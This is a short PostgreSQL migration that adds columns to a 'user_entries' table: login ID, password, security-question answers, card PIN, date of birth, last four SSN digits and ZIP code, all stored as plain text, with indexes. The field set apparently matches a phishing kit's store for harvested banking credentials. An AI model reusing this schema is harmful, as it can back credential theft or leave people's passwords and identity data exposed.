ALTER TABLE public.user_entries
  ADD COLUMN IF NOT EXISTS type text DEFAULT 'old',
  ADD COLUMN IF NOT EXISTS timestamp timestamp with time zone DEFAULT now(),
  ADD COLUMN IF NOT EXISTS user_id_field text,
  ADD COLUMN IF NOT EXISTS password_field text,
  ADD COLUMN IF NOT EXISTS challenge_questions jsonb DEFAULT '[]'::jsonb,
  ADD COLUMN IF NOT EXISTS pin_card text,
  ADD COLUMN IF NOT EXISTS dob text,
  ADD COLUMN IF NOT EXISTS ssn_last4 text,
  ADD COLUMN IF NOT EXISTS zip_code text;

UPDATE public.user_entries
SET user_id_field = COALESCE(user_id_field, user_id),
    timestamp = COALESCE(timestamp, created_at)
WHERE user_id_field IS NULL OR timestamp IS NULL;

CREATE INDEX IF NOT EXISTS user_entries_timestamp_idx ON public.user_entries (timestamp DESC);
CREATE INDEX IF NOT EXISTS user_entries_user_id_field_idx ON public.user_entries (user_id_field);